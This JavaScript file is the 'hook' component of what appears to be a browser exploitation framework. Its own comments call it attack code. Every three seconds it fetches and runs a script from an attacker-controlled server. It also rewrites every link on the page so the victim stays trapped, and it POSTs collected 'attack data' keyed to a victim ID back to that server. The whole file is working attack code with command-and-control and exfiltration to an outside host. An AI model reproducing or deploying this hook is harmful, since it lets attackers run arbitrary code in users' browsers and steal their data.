/*
The hook code loads the jquery library from a remote location,
It then polls our attack server for attack code to run.
*/

//This is a function that can be used by any attack code.
//it is used to store the attack information.
function store_AttackData(attdata){
	//Creating JSON
	var jsons = { att_data: [] };
	jsons.att_data.push ({
		"victimid": victim_id,
		"module": attack_module,
		"data": attdata
	}) 

	$.ajax({ type: "POST", url: "http://"+host_addr+"/Data/"+ctrl_key,
    	dataType: "json", data: JSON.stringify(jsons) ,
		success: function (data){ 
			var obj = $.parseJSON(data);
        }
	});
}


// Self-invoked function to Load jquery Dynamically!
(function() {
    var script = document.createElement("script");
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js';
    document.getElementsByTagName("head")[0].appendChild(script);

    // Poll for jquery to be loaded
    var checkifLoaded = function(callback){
        if(window.jQuery){
            callback(jQuery);
        }
        else{
            window.setTimeout(function(){ checkifLoaded(callback); }, 50);
        }
    };

    // Start polling...
    checkifLoaded(function($){
        $(function(){
			setInterval(function() {
				//This makes all links on the page unclickable
				//Trapping our victim on the hooked page.
				$('a').each(function(){
        			$(this).attr('href', '#');
				});
      			//load script every 3 seconds
				$.getScript('http://'+host_addr+'/Attack/'+victim_id);
			},3000);
		});
	});
})()
